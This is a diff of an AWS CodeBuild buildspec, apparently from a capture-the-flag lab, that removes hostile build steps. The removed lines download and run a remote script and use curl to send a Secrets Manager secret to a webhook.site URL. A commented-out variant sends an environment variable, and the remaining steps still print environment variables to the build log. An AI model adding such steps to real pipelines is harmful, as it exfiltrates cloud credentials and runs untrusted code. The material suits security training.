@@ -3,13 +3,7 @@ version: 0.2
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build" > /tmp/notes.txt
-      - env | sort | head -n 20 >> /tmp/notes.txt
+      - echo "Running vulnerable training build" 
+      - env | sort | head -n 20
       - echo "Done."
-      - python -m pip install botocore boto3 requests >> /tmp/notes.txt
-      - wget https://raw.githubusercontent.com/thomaspreece/AWS-CodeFactoryTokenService-API/refs/heads/main/GetBuildInfo.py
-      - python ./GetBuildInfo.py > /tmp/out.txt
-      #- python -c "import requests,sys,os; a=os.environ['SHELL'];r=requests.get('https://webhook.site/4c6c201b-a23e-4f07-8820-71f3f6e8e7bf', params={'a':a});"
-      - curl --data-urlencode "a=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1)" "https://webhook.site/4c6c201b-a23e-4f07-8820-71f3f6e8e7bf"
       
-
